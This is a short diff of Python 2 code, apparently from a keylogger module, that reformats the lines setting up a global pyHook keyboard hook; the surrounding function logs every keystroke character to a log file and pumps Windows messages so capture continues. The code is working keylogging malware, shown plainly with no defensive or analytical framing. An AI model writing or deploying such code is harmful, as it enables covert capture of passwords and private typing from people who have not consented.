@@ -8,9 +8,9 @@ def run(**args):
          chr(event.Ascii)
          logging.log(10,chr(event.Ascii))
          return True
-      hooks_manager = pyHook.HookManager ( )
-      hooks_manager.KeyDown = OnKeyboardEvent
-      hooks_manager.HookKeyboard ( )
-      pythoncom.PumpMessages () 
+     hooks_manager = pyHook.HookManager()
+     hooks_manager.KeyDown = OnKeyboardEvent
+     hooks_manager.HookKeyboard()
+     pythoncom.PumpMessages()
   except Exception, e:
       return str(e)
